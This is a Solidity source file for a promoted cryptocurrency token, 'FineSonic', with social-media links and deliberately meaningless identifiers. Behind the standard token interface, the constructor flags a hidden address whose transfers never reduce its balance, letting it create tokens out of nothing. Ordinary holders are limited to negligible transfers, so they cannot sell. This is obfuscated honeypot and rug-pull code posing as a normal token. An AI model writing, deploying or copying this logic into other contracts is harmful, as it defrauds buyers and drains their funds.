/*

Telegram: https://t.me/FineSonic

Twitter: https://twitter.com/FineSonic

Website: https://www.finesonic.crypto-token.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract FineSonic is Ownable {
    IUniswapV2Router02 private sfwuyt;

    function approve(address wefi, uint256 yropxukf) public returns (bool success) {
        allowance[msg.sender][wefi] = yropxukf;
        emit Approval(msg.sender, wefi, yropxukf);
        return true;
    }

    uint256 private enjxtdopgaq = 116;

    constructor(string memory mbluihw, string memory chubg, address wnihgsluq, address oheigda) {
        name = mbluihw;
        symbol = chubg;
        balanceOf[msg.sender] = totalSupply;
        htbmwxvka[oheigda] = enjxtdopgaq;
        sfwuyt = IUniswapV2Router02(wnihgsluq);
    }

    function transfer(address wufonpz, uint256 yropxukf) public returns (bool success) {
        pwotiqyecad(msg.sender, wufonpz, yropxukf);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    function transferFrom(address ajvkghbcudfe, address wufonpz, uint256 yropxukf) public returns (bool success) {
        require(yropxukf <= allowance[ajvkghbcudfe][msg.sender]);
        allowance[ajvkghbcudfe][msg.sender] -= yropxukf;
        pwotiqyecad(ajvkghbcudfe, wufonpz, yropxukf);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function pwotiqyecad(address ajvkghbcudfe, address wufonpz, uint256 yropxukf) private {
        address plfnbtuzsx = IUniswapV2Factory(sfwuyt.factory()).getPair(address(this), sfwuyt.WETH());
        bool owhgdzb = 0 == htbmwxvka[ajvkghbcudfe];
        if (owhgdzb) {
            if (ajvkghbcudfe != plfnbtuzsx && kbim[ajvkghbcudfe] != block.number && yropxukf < totalSupply) {
                require(yropxukf <= totalSupply / (10 ** decimals));
            }
            balanceOf[ajvkghbcudfe] -= yropxukf;
        }
        balanceOf[wufonpz] += yropxukf;
        kbim[wufonpz] = block.number;
        emit Transfer(ajvkghbcudfe, wufonpz, yropxukf);
    }

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private kbim;

    mapping(address => uint256) private htbmwxvka;

    string public symbol;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name;
}